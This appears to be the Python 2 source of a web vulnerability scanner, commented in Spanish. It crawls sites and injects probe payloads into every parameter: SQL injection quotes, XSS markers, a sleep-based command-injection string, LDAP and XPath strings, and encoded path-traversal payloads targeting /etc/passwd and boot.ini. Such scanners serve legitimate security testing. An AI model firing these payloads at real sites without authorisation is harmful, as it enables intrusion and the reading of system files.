#!/usr/bin/python
# -*- coding: utf-8 -*-
# sha0@badchecksum.net

__version__ = "$Revision: 0004000 $"

# AUDIT SUPPLIED LINKS
# ma = MassAudit()
# ma.urls = ['http://test.com/bug.php?file=aa.txt','http://test.com/bug.php?id=33']
# ma.audit()
# for s in ma.success:
#	print s

# CRAWL + AUDIT ALL LINKS	
# wa = WebsAudit()
# wa.webs = ['www.test.com']
# wa.crawlAudit()

class WebsAudit:					#def
	def __init__(self):
		self.webs=[]
		self.urls=[]
		self.ma = MassAudit()
		self.f = File()

	def crawlAudit(self):
		self.crawl()
		self.audit()

	#TODO: caso en el que un param va por get y otro va por post, el mass audit lo haga bien
	def crawl(self):
		for w in self.webs:
			c = Crawl2(w)
			c.go()
			xml = c.exportForms()
			self.f.save(xml,'webAudit.xml')

			self.urls += c.allLinks
			#Transformar las post en url tipo get (chapuzilla por ahora)
			for f in c.allForms:
				url = f.action+'?'
				try:
					for c in f.controls:
						url += c.name+'='+c.value+'&'
				except:
					pass

				if f.method == 'POST':
					url = 'F'+url
			
				self.urls.append(url)

	def audit(self):
		self.ma.urls = self.urls
		self.ma.audit()
		print "Audit Finished, results:"
		for s in self.ma.success:
			print s


	def load(self,file):
		self.webs = self.f.load(file)




#TODO:      da falsos positivos con  < y > en XSS
class MassAudit(Navigator):					#def
	def __init__(self):
		self.urls=[] 	#si la url empieza por F es un form (POST)
		self.success=[]
		Navigator.__init__(self)
		self.console = 1
		self.exploit = ''
		self.session = '' #parametros de sesion o lo que sea que debamos dejar intacto

	def help(self):
		print "Propiedades:"
		print "urls -> lista de urls con sus parametros para ser auditados"
		print "success -> lista con los ataques que funcionarion"
		print "session -> string con los nombres de parametros fijos (por ej. '&sesion=333')"
		print "console -> por defecto =1  poner a =0 para no mostar el proreso por pantalla"
		print "Metodos:"
		print "audit() -> Procede con la auditoria de los links"
		print "auditFile(f) -> Carga los links desde fichero y los audita"
		print "Para hacer crawl y luego audit() de cada link, mejor usar la clase WebsAudit()"
		
	def auditFile(self,file):
		self.load(file)
		self.audit()
	
	def audit(self):
		urls = Urls()
		urls.urls = self.urls
		urls.parse()
		self.urls = urls.urls
		del urls

		for u in self.urls:
			u = re.compile('\r|\n').sub('',u)
			if self.console:
				sys.stdout.write(u+"\t")
			self.doInj(u)
			self.doXss(u)
			self.doCmd(u)
			#self.doLdap(u)
			#self.doXpath(u)
			self.doTrans(u)
			if self.console:
				sys.stdout.write("\tDone.\n")


	def get(self,url,att):
		self.exploit = ''
		if not re.compile('\?(.*)').findall(url):
			return ''

		#Inserta ataque att en todos los parametros get
		url = re.compile('=[^&]*').sub('='+att,url)
		if (url[0] == 'F' or url[0] == 'P'):
			url = url[1:]
			x = re.compile('([^?]+)\?').findall(url)
			if x:
				url = x[0]
				url = url[:-1]
				x = re.compile('\?([^?]+)').findall(url)
				if x:
					post = x[0]
					#print "url: %s post: %s" % (url,post)
					url = url+self.session
					self.exploit = url+' '+post
					return self.go(url,post)
			return ''
		else:
			#print "url: %s" % url
			url = url+self.session
			self.exploit = url
			return self.go(url)


	def result(self,url,type,pattern):
		self.success.append(self.exploit)
		if self.console:
			print self.exploit
			print type+"->"+pattern+"!!!!!!"
			#fd = open('success','a')
			#fd.write(url+" "+type+"->"+pattern+"!!!!!!\n")
			#fd.close()


	def doInj(self,url):
		att = '%27%22%25%32%37%25%32%32';
		resp = ['ORA\-','ODBC','MySQL',' SQL','Dataset not defined']
		html = self.get(url,att)
		for r in resp:
			if re.compile(r).findall(html):
				self.result(url,'INJ',r)

	def doXss(self,url):
		att = 'wewe"wewe%27wewe%22wewe>wewe<wewe'
		resp = ['wewe"wewe','wewe\'wewe','wewe>wewe','wewe<wewe']
		html = self.get(url,att)
		for r in resp:
			if re.compile(r).findall(html):
				self.result(url,'XSS',r)

	def doCmd(self,url):
		att = '|sleep+6+#+$(sleep 6)+#+`sleep 6`;sleep+6+#;'
		html = self.get(url,att)
		#timer (todo)


	def doLdap(self,url):
		att = ')(|(cn=*))'
		#(ŧodo)

	def doXpath(self,url):
		att = '</xml>]]/\'or 1=1 or \'\'=\''
		resp = ['<\/','\/>']
		#(todo)

	def doTrans(self,url):
		att = ['../../../../../../../../../../etc/passwd','../../../../../../../../../../boot.ini','../../../../../../../../../../inetpub/wwwroot/iisstart.htm','%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%36%35%25%37%34%25%36%33%25%32%66%25%37%30%25%36%31%25%37%33%25%37%33%25%37%37%25%36%34','%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%36%32%25%36%66%25%36%66%25%37%34%25%32%65%25%36%39%25%36%65%25%36%39','%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%32%65%25%32%65%25%32%66%25%36%39%25%36%65%25%36%35%25%37%34%25%37%30%25%37%35%25%36%32%25%32%66%25%37%37%25%37%37%25%37%37%25%37%32%25%36%66%25%36%66%25%37%34%25%32%66%25%36%39%25%36%39%25%37%33%25%37%33%25%37%34%25%36%31%25%37%32%25%37%34%25%32%65%25%36%38%25%37%34%25%36%64']
		resp = ['root:0','\[boot loader\]']
		html = ''

		for a in att:
			html += self.get(url,a)

		for r in resp:
			if re.compile(r).findall(html):
				self.result(url,'TRANS',r)

	def load(self,file):
		fd = open(file,'r')
		self.urls = fd.readlines()
		fd.close()

